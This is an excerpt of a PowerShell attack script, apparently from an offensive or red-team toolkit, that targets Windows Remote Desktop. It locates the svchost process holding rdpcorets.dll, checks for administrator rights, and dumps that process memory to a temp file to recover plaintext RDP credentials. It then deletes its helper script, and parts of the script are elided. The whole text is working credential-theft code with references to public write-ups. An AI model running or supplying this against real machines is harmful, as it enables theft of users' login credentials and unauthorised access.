...
## dumping-plaintext-rdp-credentials-from-svchost
# https://pentestlab.blog/2021/05/24/dumping-rdp-credentials/
# https://www.n00py.io/2021/05/dumping-plaintext-rdp-credentials-from-svchost-exe/
Write-Host "DUMPING PLAINTEXT RDP CREDENTIALS FROM SVCHOST"
Write-Host "[i] Credentials are stored in plaintext in memory" -ForeGroundColor Yellow
Write-Host "-------------------------------------------------"
If((Get-Service -Name termservice).Status -ieq "Running")
{
   Write-Host "[RDP] 'termservice' service Running! [" -ForeGroundColor DarkGray -NoNewline;
   Write-Host "OK" -ForeGroundColor Green -NoNewline;
   Write-Host "]" -ForeGroundColor DarkGray;
   Start-Sleep -Milliseconds 800
   #Querying which task has loaded the rdpcorets.dll
   $QueryTasts = tasklist /M:rdpcorets.dll

   If($QueryTasts -iMatch 'svchost.exe')
   {
      $IPATH = (Get-Location).Path.ToString()
      Write-Host "[RDP] 'rdpcorets.dll' loaded by svchost! [" -ForeGroundColor DarkGray -NoNewline;
      Write-Host "OK" -ForeGroundColor Green -NoNewline;
      Write-Host "]" -ForeGroundColor DarkGray;
      Start-Sleep -Milliseconds 800
      $rtt = netstat -nob | Select-String -Pattern "TermService"
      $PPID = $rtt.split('')[-1] #Grab RDP connection PID from netstat to prevent more svchost PIds

      #Get-ProcessMiniDump requires Administrator privileges to run
      $bool = (([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match "S-1-5-32-544")
      If($bool)
      {
         Write-Host "[RDP] Importing Get-ProcessMiniDump cmdlet! [" -ForeGroundColor DarkGray -NoNewline;
         ...
         Write-Host "[RDP] 'rdpcorets.dll' dumped to '$Env:TMP\rdpcoretsDLL.out'" -ForeGroundColor Green
         Remove-Item -Path "$Env:TMP\Get-ProcessMiniDump.ps1" -EA SilentlyContinue -Force
         cd $IPATH 
      }
       Else
      {
         Write-Host "[RDP] Get-ProcessMiniDump requires admin privs! [VULNERABLE::T1021]" -ForeGroundColor DarkGray
      }
   ...
   Else
   {
      Write-Host "[RDP] 'rdpcorets.dll' not loaded by svchost service!" -ForeGroundColor Red -BackGroundColor Black   
   }
}
Else
{
   Write-Host "[RDP] 'termservice' service stopped! [not-vuln]" -ForeGroundColor Red -BackGroundColor Black
}
Write-Host "`n"
